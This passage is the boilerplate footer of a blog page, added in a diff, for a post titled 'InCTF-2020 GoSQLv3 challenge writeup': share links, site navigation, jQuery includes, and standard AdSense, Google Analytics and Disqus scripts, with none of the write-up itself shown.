+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&name=InCTF-2020 GoSQLv3 challenge writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 SpyD3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad_1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6813652886953741"
+     data-ad-slot="9851733933"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-122832343-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'spyclub';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
